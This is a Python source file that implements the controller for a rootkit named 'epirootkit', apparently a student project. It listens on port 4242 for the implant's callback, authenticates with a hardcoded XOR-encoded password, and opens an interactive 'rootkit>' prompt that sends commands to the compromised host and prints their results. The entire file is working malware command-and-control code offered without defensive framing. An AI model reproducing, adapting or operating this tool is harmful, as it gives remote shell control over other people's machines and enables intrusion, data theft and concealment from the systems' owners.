import socket
import sys
import time
import binascii

DEBUG = True
KEY = "epirootkit"
HOST = "0.0.0.0"
PORT = 4242

def debug_hexdump(prefix, data):
    if DEBUG:
        hex_dump = ' '.join(f'{b:02x}' for b in data)
        ascii_dump = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data)
        print(f"[DEBUG] {prefix}:")
        print(f"[DEBUG] Hex:   {hex_dump}")
        print(f"[DEBUG] ASCII: {ascii_dump}")

def xor_encrypt(data: bytes) -> bytes:
    """
    Implements XOR encryption using the key.
    Each byte of input is XORed with the corresponding byte of the key (cycling if needed).
    """
    key_bytes = KEY.encode('ascii')
    key_len = len(key_bytes)
    result = bytearray()

    # Debug the input
    debug_hexdump("Input data", data)
    debug_hexdump("Key", key_bytes)

    # Perform XOR encryption/decryption
    for i in range(len(data)):
        key_byte = key_bytes[i % key_len]
        result.append(data[i] ^ key_byte)

    # Debug the output
    debug_hexdump("Output data", result)
    return bytes(result)

def receive_until_eof(client, timeout=5):
    """Receive data until --EOF-- marker is found or timeout occurs"""
    client.settimeout(0.1)
    start_time = time.time()
    response = bytearray()

    while time.time() - start_time < timeout:
        try:
            chunk = client.recv(2048)
            if not chunk:
                if response:  # If we already have some data, process it
                    break
                continue

            response.extend(chunk)
            decrypted = xor_encrypt(response)
            if b'--EOF--' in decrypted:
                break

        except socket.timeout:
            if response:  # If we have data but hit timeout, process what we have
                break
            continue
        except Exception as e:
            print(f"Error receiving data: {e}")
            break

    return bytes(response)

def handle_client(client):
    try:
        # Send encrypted password
        password = b"epirootkit\n"
        encrypted_pass = xor_encrypt(password)
        print("[*] Sending authentication...")
        client.sendall(encrypted_pass)

        # Receive and decrypt auth response
        auth_response_encrypted = receive_until_eof(client)
        if not auth_response_encrypted:
            print("[-] No response received")
            return

        auth_response = xor_encrypt(auth_response_encrypted)
        try:
            auth_text = auth_response.decode('ascii', errors='ignore')
            print("[+] Authentication response:")
            print(auth_text.replace('--EOF--', '').strip())

            if "FAIL" in auth_text:
                print("[-] Authentication failed")
                return

        except UnicodeDecodeError:
            print("[-] Received corrupted auth response")
            return

        print("[+] Successfully authenticated")
        print("[*] Enter commands (type 'exit' to quit):")

        # Interactive shell loop
        while True:
            try:
                cmd = input("rootkit> ").strip()
                if not cmd:
                    continue
                if cmd.lower() == "exit":
                    print("[*] Sending exit command...")
                    encrypted_cmd = xor_encrypt(b"exit\n")
                    client.sendall(encrypted_cmd)
                    break

                # Send encrypted command
                cmd_bytes = (cmd + "\n").encode('ascii')
                encrypted_cmd = xor_encrypt(cmd_bytes)
                client.sendall(encrypted_cmd)

                # Receive and decrypt response
                response_encrypted = receive_until_eof(client)
                if response_encrypted:
                    response = xor_encrypt(response_encrypted)
                    try:
                        response_text = response.decode('ascii', errors='ignore')
                        output = response_text.replace('--EOF--', '').strip()
                        if output:
                            print(output)
                    except UnicodeDecodeError:
                        print("[-] Received corrupted response")

            except KeyboardInterrupt:
                print("\n[*] Sending exit command...")
                encrypted_cmd = xor_encrypt(b"exit\n")
                client.sendall(encrypted_cmd)
                break
            except Exception as e:
                print(f"[-] Error during command execution: {e}")
                break

    except Exception as e:
        print(f"[-] Connection error: {e}")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((HOST, PORT))
            server.listen(1)
            print(f"[*] Waiting for connection on {HOST}:{PORT}...")

            while True:
                client, addr = server.accept()
                print(f"[+] Connection from {addr[0]}:{addr[1]}")
                client.settimeout(5)  # Set a default timeout
                handle_client(client)
                client.close()

        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
        except Exception as e:
            print(f"[-] Server error: {e}")

if __name__ == "__main__":
    main()